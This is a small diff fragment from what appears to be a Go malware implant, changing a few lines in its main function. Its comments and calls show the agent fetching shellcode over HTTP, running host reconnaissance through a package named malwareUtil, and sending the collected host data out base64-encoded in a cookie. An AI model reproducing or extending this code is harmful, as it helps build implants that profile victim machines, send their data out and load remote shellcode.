@@ -33,8 +33,8 @@ func main() {
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
 	//initial recon
-	host := util.Recon()
-	initChecks = util.UnmarshalJSON(host)
+	host := malwareUtil.Recon()
+	initChecks, _ = util.UnmarshalJSON(host)
 	cookie := b64.StdEncoding.EncodeToString(host)
 	//initial request
 	body = request(cookie, conf)
